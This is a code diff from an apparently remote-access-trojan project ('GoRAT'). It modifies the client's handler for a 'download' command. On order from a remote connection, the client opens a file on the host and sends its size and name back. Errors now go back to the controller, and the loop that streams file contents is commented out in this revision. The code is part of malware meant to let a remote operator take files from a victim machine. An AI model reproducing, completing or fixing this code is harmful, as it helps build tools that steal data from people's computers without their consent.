@@ -3,7 +3,6 @@ package client
 import (
 	"GoRAT/internal/client/plugins"
 	"fmt"
-	"io"
 	"net"
 	"os"
 	"strconv"
@@ -140,34 +139,58 @@ func Client() {
 			dir := strings.Split(string(buff[:n]), " ")
 
 			if len(dir) == 2 && dir[0] == "download" {
+
 				file, err := os.Open(dir[1])
+
 				if err != nil {
-					fmt.Println(err)
-					return
-				}
-				fileInfo, err := file.Stat()
-				if err != nil {
-					fmt.Println(err)
-					return
+					_, err = conn.Write([]byte(err.Error()))
+
+					if err != nil {
+						fmt.Println(err)
+						return
+					}
+					continue
 				}
 
+				fileInfo, err := file.Stat()
+
+				if err != nil {
+					_, err = conn.Write([]byte(err.Error()))
+
+					if err != nil {
+						fmt.Println(err)
+						return
+					}
+					continue
+				}
 				fileSize := fillString(strconv.FormatInt(fileInfo.Size(), 10), 10)
 				fileName := fillString(fileInfo.Name(), 64)
-				fmt.Println("Sending filename and filesize!")
 
-				conn.Write([]byte(fileSize))
-				conn.Write([]byte(fileName))
-				sendBuffer := make([]byte, 1024)
-				fmt.Println("Start sending file!")
-				for {
-					_, err = file.Read(sendBuffer)
-					if err == io.EOF {
-						break
-					}
-					conn.Write(sendBuffer)
+				fmt.Println("fileSize ", fileSize, "fileName ", fileName)
+
+				_, err = conn.Write([]byte(fileSize))
+				if err != nil {
+					fmt.Println("fileSize send ", err)
 				}
-				file.Close()
-				fmt.Println("File has been sent, closing connection!")
+
+				_, err = conn.Write([]byte(fileName))
+				if err != nil {
+					fmt.Println("fileName send ", err)
+				}
+				//sendBuffer := make([]byte, 1024)
+				//fmt.Println("Start sending file!")
+				//for {
+				//	_, err = file.Read(sendBuffer)
+				//	if err == io.EOF {
+				//		break
+				//	}
+				//	_, err = conn.Write(sendBuffer)
+				//	if err != nil {
+				//		fmt.Println("Buff send", err)
+				//	}
+				//}
+				//file.Close()
+				//fmt.Println("File has been sent, closing connection!")
 
 			}
 
